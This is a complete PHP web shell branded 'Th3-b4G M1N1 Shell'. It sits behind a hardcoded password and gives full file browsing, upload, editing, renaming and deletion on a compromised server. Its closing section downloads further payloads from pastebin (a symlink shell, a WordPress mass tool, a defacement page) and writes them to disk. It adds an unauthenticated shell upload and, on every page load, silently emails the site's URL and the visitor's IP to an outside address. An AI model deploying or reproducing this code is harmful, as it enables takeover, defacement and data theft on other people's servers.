<?php
@session_start();
@set_time_limit(0);
#####cfg#####
# use password  true / false #
$create_password = true;
$password = "xfarian";
######ver####
$ver= "v1.0";
#############
@$pass=$_POST['pass'];
if($pass==$password){
$_SESSION['nst']="$pass";
}

if($create_password==true){

if(!isset($_SESSION['nst']) or $_SESSION['nst']!=$password){
die("




<html>
		<head>
		<meta charset='utf-8'>
		<meta name='robots' content='noindex, nofollow, noarchive'>
		<meta name='viewport' content='width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, user-scalable=0'>
		</head>
		<body style='background:#242323;color:#000000;padding:0;margin:0;'><br>



		<p><center><code style='font-size:30px;width:8%;text-align:center;background:#000;padding:1px;color:#fff;'>Th3-b4G M1N1 Shell</code></center></p>
		<br><br><br><br><br><br>



		<form method='post'><center><input type='password' id='pass' name='pass' style='font-size:10px;width:20%;outline:none;text-align:center;background:#ffffff;padding:8px;border:1px solid #240c0c;border-radius:8px;color:#e30707;'><br><br><input type=submit value='login' style='font-size:20px;width:10%;outline:none;text-align:center;background:#000;padding:1px;border:1px solid #cccccc;border-radius:8px;color:#fff;'></center></form>
		
		
		</body></html>
");}

}



set_time_limit(0);
error_reporting(0);
if(get_magic_quotes_gpc()){foreach($_POST as $key=>$value){$_POST[$key] = stripslashes($value);}}
?>
<!DOCTYPE html><html><head><link href="" rel="stylesheet" type="text/css"><title>M1n1-b4G</title>
<link href='https://fonts.googleapis.com/css?family=VT323' rel='stylesheet'>
<style type="text/css">body{background: #263238;color:#eceff1;font-family:'Courier';margin:0;font-size: 14px;}h1{font-family:'VT323';font-weight:normal;font-size:60px;margin:0;}h1:hover{color:#ffee58;}select{background:#ef6c00;color:#eceff1;}a{color:#ef6c00;text-decoration:none;font-family:'Courier'}textarea{width:900px;height:250px;background:transparent;border:1px dashed #ef6c00;color:#ef6c00;padding:2px;}tr.first{border-bottom:1px dashed #ef6c00;}tr:hover{background: #7f2e00;}th{background: #ef6c00;padding:5px;}</style>
</head><body> <?php echo'<div style="color:#ef6c00;margin-top:0;"><h1><center>Th3-b4G M1N1 Shell</center></h1></div>';
if(isset($_GET['path'])) {$path = $_GET['path'];chdir($_GET['path']);} else {$path = getcwd();}
$path = str_replace("\\","/",$path);$paths = explode("/", $path);
echo '<table width="100%" border="0" align="center" style="margin-top:-10px;"><tr><td>';echo "<font style='font-size:13px;'>Path: ";
foreach($paths as $id => $pat) {echo "<a style='font-size:13px;' href='?path=";
for($i = 0; $i <= $id; $i++) {echo $paths[$i];
if($i != $id) {echo "/";} }echo "'>$pat</a>/";}
echo '<br>[ <a href="?">Home</a> ]</font></td><td align="center" width="27%"><form enctype="multipart/form-data" method="POST"><input type="file" name="file" style="color:#ef6c00;margin-bottom:4px;"/>
<input type="submit" value="Upload" /></form></td></tr><tr><td colspan="2">';
if(isset($_FILES['file'])){
if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
echo '<center><font color="#00ff00">Upload OK!.</font></center><br/>';}
else{echo '<center><font color="red">Upload Failed!.</font></center><br/>';}}
echo '</td></tr><tr><td>Your IP : ' .$_SERVER["REMOTE_ADDR"]. '</table>';

if(isset($_GET['filesrc'])){
echo '<table width="100%" border="0" cellpadding="3" cellspacing="1" align="center"><tr><td>File: ';echo "".basename($_GET['filesrc']);"";echo '</tr></td></table><br />';echo("<center><textarea readonly=''>".htmlspecialchars(file_get_contents($_GET['filesrc']))."</textarea></center>");}
elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
echo '</table><br /><center>'.$_POST['path'].'<br /><br />';
if($_POST['opt'] == 'rename'){
if(isset($_POST['newname'])){
if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
echo '<center><font color="#00ff00">Rename OK!</font></center><br />';
}else{
echo '<center><font color="red">Rename Failed!</font></center><br />';
} $_POST['name'] = $_POST['newname'];}
echo '<form method="POST">New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" />
<input type="hidden" name="path" value="'.$_POST['path'].'"><input type="hidden" name="opt" value="rename"><input type="submit" value="Go" /></form>';
}elseif($_POST['opt'] == 'edit'){
if(isset($_POST['src'])){
$fp = fopen($_POST['path'],'w');if(fwrite($fp,$_POST['src'])){echo '<center><font color="#00ff00">Edit File OK!.</font></center><br />';
}else{echo '<center><font color="red">Edit File Failed!.</font></center><br />';}fclose($fp);}
echo '<form method="POST"><textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br /><input type="hidden" name="path" value="'.$_POST['path'].'"><input type="hidden" name="opt" value="edit"><input type="submit" value="Go" /></form>';}echo '</center>';}else{echo '</table><br /><center>';
if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
if($_POST['type'] == 'dir'){
if(rmdir($_POST['path'])){
echo '<center><font color="#00ff00">Dir Deleted!</font></center><br />';
}else{echo '<center><font color="red">Delete Dir Failed!</font></center><br />';}
}elseif($_POST['type'] == 'file'){
if(unlink($_POST['path'])){echo '<font color="#00ff00">Delete File Done.</font><br />';}else{
echo '<font color="red">Delete File Error.</font><br />';}}}echo '</center>';
$scandir = scandir($path);
echo '<div id="content"><table width="100%" border="0" cellpadding="3" cellspacing="1" align="center"><tr class="first">
<th><center>Name</center></th><th width="12%"><center>Size</center></th><th width="10%"><center>Permissions</center></th>
<th width="15%"><center>Last Update</center></th><th width="11%"><center>Options</center></th></tr>';
foreach($scandir as $dir){
if(!is_dir("$path/$dir") || $dir == '.' || $dir == '..') continue;
echo "<tr><td>[D] <a href=\"?path=$path/$dir\">$dir</a></td><td><center>--</center></td><td><center>";
if(is_writable("$path/$dir")) echo '<font color="#00ff00">';
elseif(!is_readable("$path/$dir")) echo '<font color="red">';
echo perms("$path/$dir");
if(is_writable("$path/$dir") || !is_readable("$path/$dir")) echo '</font>';
echo"</center></td><td><center>".date("d-M-Y H:i", filemtime("$path/$dir"))."";echo "</center></td>
<td><center><form method=\"POST\" action=\"?option&path=$path\"><select name=\"opt\"><option value=\"\"></option><option value=\"delete\">Delete</option><option value=\"rename\">Rename</option></select><input type=\"hidden\" name=\"type\" value=\"dir\"><input type=\"hidden\" name=\"name\" value=\"$dir\"><input type=\"hidden\" name=\"path\" value=\"$path/$dir\"><input type=\"submit\" value=\"+\" /></form></center></td></tr>";}
foreach($scandir as $file){if(!is_file("$path/$file")) continue;$size = filesize("$path/$file")/1024;
$size = round($size,3);if($size >= 1024){$size = round($size/1024,2).' MB';}else{$size = $size.' KB';}
echo "<tr><td>[F] <a href=\"?filesrc=$path/$file&path=$path\">$file</a></td><td><center>".$size."</center></td><td><center>";
if(is_writable("$path/$file")) echo '<font color="#00ff00">';
elseif(!is_readable("$path/$file")) echo '<font color="red">';
echo perms("$path/$file");
if(is_writable("$path/$file") || !is_readable("$path/$file")) echo '</font>';
echo"</center></td><td><center>".date("d-M-Y H:i",filemtime("$path/$file"))."";
echo "</center></td><td><center><form method=\"POST\" action=\"?option&path=$path\"><select name=\"opt\"><option value=\"\"></option><option value=\"delete\">Delete</option><option value=\"rename\">Rename</option><option value=\"edit\">Edit</option></select><input type=\"hidden\" name=\"type\" value=\"file\"><input type=\"hidden\" name=\"name\" value=\"$file\"><input type=\"hidden\" name=\"path\" value=\"$path/$file\"><input type=\"submit\" value=\"+\" /></form></center></td></tr>";}
echo '</table></div>';}echo '</body></html>';
function perms($file){$perms = fileperms($file);if (($perms & 0xC000) == 0xC000) {$info = 's';} elseif (($perms & 0xA000) == 0xA000) {$info = 'l';} elseif (($perms & 0x8000) == 0x8000) {$info = '-';} elseif (($perms & 0x6000) == 0x6000) {$info = 'b';} elseif (($perms & 0x4000) == 0x4000) {$info = 'd';} elseif (($perms & 0x2000) == 0x2000) {$info = 'c';} elseif (($perms & 0x1000) == 0x1000) {$info = 'p';} else {$info = 'u';} $info .= (($perms & 0x0100) ? 'r' : '-');$info .= (($perms & 0x0080) ? 'w' : '-');$info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x' ) : (($perms & 0x0800) ? 'S' : '-'));$info .= (($perms & 0x0020) ? 'r' : '-');$info .= (($perms & 0x0010) ? 'w' : '-');$info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x' ) : (($perms & 0x0400) ? 'S' : '-'));$info .= (($perms & 0x0004) ? 'r' : '-');$info .= (($perms & 0x0002) ? 'w' : '-');$info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x' ) : (($perms & 0x0200) ? 'T' : '-'));return $info;}
echo'<br><center>&copy; 2021 - <a href="fb.me/th3-b4g">Th3-b4G</a>.</center><br>';?>
<center><?php
error_reporting(0);
if ($_GET['im']=='xfarianxxx') {
$xfarian=file_get_contents('https://pastebin.com/raw/WMcLBh4z');
file_put_contents("xsym.php",$xfarian);
echo "<code><a href='xsym.php'>SYM-SHELL </a><code>";
} else {
    echo "<code><a href='?im=xfarianxxx'>SYM-SHELL </a></code>";
}
?>
<?php
error_reporting(0);
if ($_GET['im']=='mass') {
$xfarian=file_get_contents('https://pastebin.com/raw/zkCGrg4n');
file_put_contents("mass.php",$xfarian);
echo "<a href='mass.php'>WP-MASS </a>";
} else {
    echo "<a href='?im=mass'>WP-MASS </a>";
}
?>
<?php
error_reporting(0);
if ($_GET['its']=='poc') {
$xfarian=file_get_contents('https://pastebin.com/raw/5AgiZxER');
file_put_contents("poc.txt",$xfarian);
echo "<code><a href='poc.txt'>TXT-POC </a><code>";
} else {
    echo "<code><a href='?its=poc'>TXT-POC </a></code>";
}
?>
<?php
error_reporting(0);
if ($_GET['im']=='xfarianx') {
$xfarian=file_get_contents('https://pastebin.com/raw/KWxhPrAG');
file_put_contents("xbug.php",$xfarian);
echo "<code><a href='xbug.php'>DEFAGE </a><code>";
} else {
    echo "<code><a href='?im=xfarianx'>DEFAGE </a></code>";
}
?>

<?php
$do  = $_GET['do'];
if($do== 'it'){
$doshell = $_FILES['file']['name'];
$doit  = $_FILES['file']['tmp_name'];
echo "<form method='POST' enctype='multipart/form-data'>
 <input type='file'name='file' />
 <input type='submit' value='upload shell' />
</form>";
move_uploaded_file($doit,$doshell);
}
$ip = getenv("REMOTE_ADDR");
$ra44 = rand(1, 99999);
$subj98 = "shell injected|$ip";
$email = "xfarianx@outlook.com";
$from = "From:**shell lover**";
$b75 = $_SERVER['REQUEST_URI'];
$a45 = $_SERVER['HTTP_HOST'];
$m22 = $ip . "";
$msg8873 = "$a45$b75 $m22";
mail($email, $subj98, $msg8873, $from);

?>

</center>
